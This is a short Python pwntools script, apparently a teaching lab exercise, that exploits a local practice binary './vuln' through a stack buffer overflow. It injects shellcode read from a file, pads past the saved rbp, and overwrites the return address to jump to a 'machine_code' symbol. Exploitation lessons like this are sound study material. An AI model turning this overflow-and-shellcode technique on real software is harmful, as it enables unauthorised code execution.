#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
elf = ELF(BIN)

machine_code_addr = elf.symbols["machine_code"]

# Determined through static analysis.
bytes_read = 128
buf_offset = 16

# Later, we'll see how to use pwntools to solve this step as well.
with open("hello_shellcode.bin", "rb") as fin:
    shellcode = fin.read()

# First part: inject
payload = b""
payload += shellcode
payload += (128 - len(shellcode)) * b'A'

# Second part: trigger
payload += (buf_offset + 8) * b'A'  # + 8 for the saved rbp
payload += pack(machine_code_addr)

io = process(BIN)
io.send(payload)
io.interactive()
